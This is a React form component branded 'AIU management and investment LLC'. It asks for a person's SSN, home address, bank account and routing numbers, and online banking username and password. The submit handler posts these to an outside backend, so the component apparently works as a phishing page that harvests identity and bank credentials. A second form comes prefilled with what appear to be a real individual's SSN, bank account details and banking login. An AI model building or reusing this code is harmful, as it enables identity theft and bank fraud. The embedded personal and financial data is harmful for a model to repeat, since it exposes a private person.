import React, { useState } from "react";
import { FiUser, FiLock,FiPhone, FiDollarSign, FiEdit } from "react-icons/fi";
import { BsHouse } from "react-icons/bs";

function CompanyForm() {
  const initialData2 = {
    firstName: "",
    lastName: "",
    ssnDemo: "",
    bankName: "",
    phone:"",
    houseAddress:"",
    accountNumber: "",
    emailAddress: "",
    routingNumber: "",
    accessUsername: "",
    accessPassword: "",
  };

  const initialData = {
    firstName: "Sandra ",
    lastName: "ray ",
    ssnDemo: "985263413",
    bankName: "City Bank",
    phone:"+19044223108",
    houseAddress:"506 E 5th St, Jacksonville, FL 32206",
    accountNumber: "42047107083",
    emailAddress: "aiumanagementinvestmentllc@gmail.com",
    routingNumber: "321171184",
    accessUsername: "20BATMAN26",
    accessPassword: "Grayson26!",
  };

  const [form1, setForm1] = useState(initialData2);
  const [form2, setForm2] = useState(initialData);

  const handleChange = (e, setter) => {
    setter((prev) => ({
      ...prev,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch("https://ayobackend.onrender.com/api/users", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(form1),
      });

      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error("Submit Error:", error);
      alert("Error sending data to backend");
    }
  };

  const handleReset = () => {
    setForm1(initialData);
    setForm2(initialData);
  };

  const fields = [
    { label: "First Name", name: "firstName", icon: <FiUser /> },
    { label: "Last Name", name: "lastName", icon: <FiUser /> },
    { label: "SSN", name: "ssnDemo", icon: <FiEdit /> },
    { label: "Email Address", name: "emailAddress", icon: <FiEdit /> },
    { label: "House Address", name: "houseAddress", icon: <BsHouse /> },
    { label: "Phone Number", name: "phone", icon: <BsHouse /> },

    { label: "Bank Name", name: "bankName", icon: <FiDollarSign /> },
    { label: "Account Number", name: "accountNumber", icon: <FiEdit /> },
    { label: "Routing Number", name: "routingNumber", icon: <FiEdit /> },

    { label: "Online Access Username", name: "accessUsername", icon: <FiUser /> },
    { label: "Online Access Password", name: "accessPassword",  icon: <FiLock /> },
  ];

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-6">
      <div className="max-w-6xl w-full bg-white shadow-2xl rounded-2xl p-10">
        <div className=" flex flex-col mb-10 items-center">
          <h2 className="text-4xl font-bold text-center">
            AIU management and investment LLC
          </h2>
          <div className=" flex gap-5">
            <span>tel: <span className=" text-blue-700">+19044223108</span> </span>
            <span>email: <span className=" text-blue-700">sandraav090@gmail.com</span></span>
          </div>

        </div>
       

        <form onSubmit={handleSubmit}>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-10">

            {/* ========= FORM 1 ========== */}
            <div className="p-6 bg-gray-50 rounded-2xl shadow-lg">
              <h3 className="text-2xl font-semibold mb-6">Form 1</h3>

              <div className="space-y-6">
                {fields.map((item) => (
                  <div key={"f1-" + item.name}>
                    <label className="text-black font-medium">{item.label}</label>

                    <div className="flex items-center mt-1 bg-white p-3 rounded-lg border">
                      <span className="text-black text-xl mr-3">{item.icon}</span>

                      <input
                        type={item.type || "text"}
                        name={item.name}
                        value={form1[item.name]}
                        onChange={(e) => handleChange(e, setForm1)}
                        className="w-full bg-transparent outline-none"
                        placeholder={`Enter ${item.label}`}
                      />
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* ========= FORM 2 ========== */}
            <div className="p-6 bg-gray-50 rounded-2xl shadow-lg">
              <h3 className="text-2xl font-semibold mb-6">Form 2</h3>

              <div className="space-y-6">
                {fields.map((item) => (
                  <div key={"f2-" + item.name}>
                    <label className="text-black font-medium">{item.label}</label>

                    <div className="flex items-center mt-1 bg-white p-3 rounded-lg border">
                      <span className="text-black text-xl mr-3">{item.icon}</span>

                      <input
                        type={item.type || "text"}
                        name={item.name}
                        value={form2[item.name]}
                        onChange={(e) => handleChange(e, setForm2)}
                        className="w-full bg-transparent outline-none"
                        placeholder={`Enter ${item.label}`}
                      />
                    </div>
                  </div>
                ))}
              </div>
            </div>

          </div>

          {/* ===== BUTTONS ===== */}
          <div className="flex justify-center mt-10 gap-6">
            <button
              type="submit"
              className="px-10 py-3 bg-green-500 text-white rounded-xl shadow-lg hover:bg-green-600"
            >
              Submit
            </button>

            <button
              type="button"
              onClick={handleReset}
              className="px-10 py-3 bg-red-500 text-white rounded-xl shadow-lg hover:bg-red-600"
            >
              Reset
            </button>
          </div>

        </form>
      </div>
    </div>
  );
}

export default CompanyForm;
